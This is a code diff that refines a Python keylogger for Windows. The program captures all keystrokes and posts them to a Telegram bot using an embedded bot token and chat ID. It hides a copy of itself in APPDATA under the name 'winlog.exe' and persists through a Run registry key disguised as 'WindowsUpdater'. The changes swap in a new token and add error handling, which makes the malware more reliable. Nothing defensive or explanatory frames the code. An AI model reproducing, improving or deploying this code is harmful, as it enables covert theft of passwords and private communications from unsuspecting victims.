@@ -8,7 +8,7 @@ import winreg
 import ctypes
 
 # --- Config ---
-bot_token = '7067966206:AAH934M6UbjCO31u5iO2LxQQMbdk40ADRHU'
+bot_token = '7782356344:AAGdFwO_BT618xgL_TQpDSl_OmevkzKuB3Q'
 chat_id = '5485031378'
 interval = 30
 filename = "winlog.exe"
@@ -20,19 +20,19 @@ def send_log(message):
     data = {'chat_id': chat_id, 'text': message}
     try:
         requests.post(url, data=data)
-    except:
-        pass
+    except Exception as e:
+        print(f"Error sending log: {e}")  # For debugging
 
 # --- Key logger ---
 def on_press(key):
     global log
     try:
-        log += key.char
+        log += str(key.char)
     except AttributeError:
-        if key == key.space:
+        if key == keyboard.Key.space:
             log += ' '
         else:
-            log += f' [{key}] '
+            log += f' [{str(key)}] '
 
 def report():
     global log
@@ -47,26 +47,29 @@ def report():
 def setup():
     hidden_path = os.path.join(os.getenv("APPDATA"), filename)
     if not os.path.exists(hidden_path):
-        # Copy to hidden location
-        shutil.copy2(sys.executable, hidden_path)
+        try:
+            # Copy to hidden location
+            shutil.copy2(sys.executable, hidden_path)
 
-        # Make file hidden
-        ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)  # 2 = Hidden attribute
+            # Make file hidden
+            ctypes.windll.kernel32.SetFileAttributesW(hidden_path, 2)  # 2 = Hidden attribute
 
-        # Add to registry to autorun
-        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
-                             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-                             0, winreg.KEY_SET_VALUE)
-        winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, hidden_path)
-        winreg.CloseKey(key)
+            # Add to registry to autorun
+            with winreg.OpenKey(winreg.HKEY_CURRENT_USER,
+                              r"Software\Microsoft\Windows\CurrentVersion\Run",
+                              0, winreg.KEY_SET_VALUE) as key:
+                winreg.SetValueEx(key, "WindowsUpdater", 0, winreg.REG_SZ, hidden_path)
 
-        # Run the hidden file, close original
-        os.startfile(hidden_path)
-        sys.exit()
+            # Run the hidden file, close original
+            os.startfile(hidden_path)
+            sys.exit()
+        except Exception as e:
+            print(f"Setup error: {e}")  # For debugging
 
 # --- Start ---
-setup()
-report()
+if __name__ == "__main__":
+    setup()
+    report()
 
-with keyboard.Listener(on_press=on_press) as listener:
-    listener.join()
+    with keyboard.Listener(on_press=on_press) as listener:
+        listener.join()
